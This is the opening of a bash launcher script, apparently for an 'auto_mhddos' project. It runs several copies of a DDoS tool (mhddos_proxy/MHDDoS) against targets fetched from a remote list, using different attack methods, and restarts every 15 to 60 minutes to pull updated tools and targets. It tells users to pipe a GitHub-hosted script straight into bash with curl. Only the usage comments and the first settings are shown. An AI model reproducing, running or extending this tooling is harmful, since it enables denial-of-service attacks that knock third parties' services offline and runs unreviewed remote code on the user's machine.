##### Use next command in local linux terminal to run this script.
#  >>>>>   curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash  <<<<<
##### It is possible to pass arguments "num_of_copies" and "restart_interval" to script.
##### curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash -s -- 2 1800 (launch with num_of_copies=2 and restart_interval=1800)

##### To kill script just close terminal window. OR. In other terminal run 'pkill -f python3'. And press CTRL+C in main window.

## "num_of_copies" allows to start several copies of runner.py.
## Each copy will choose different target from https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets
## This is different from "multiple targets" in mhddos_proxy. Built in mhddos_proxy "multiple targets" can attack multiple IP's but only with same one method.
## "num_of_copies" allows to launch several copies of runner.py and targets will be attacked with different methods.
## Default = 2 copies(instances). Don't use high values without testing first, pc/vps can slowdown.
num_of_copies="${1:-2}"

## Restart script every N seconds (900s = 15m, 1800s = 30m, 3600s = 60m).
## It allows to download updates for mhddos_proxy, MHDDoS and target list.
## By default 900s (15m), can be passed as second parameter
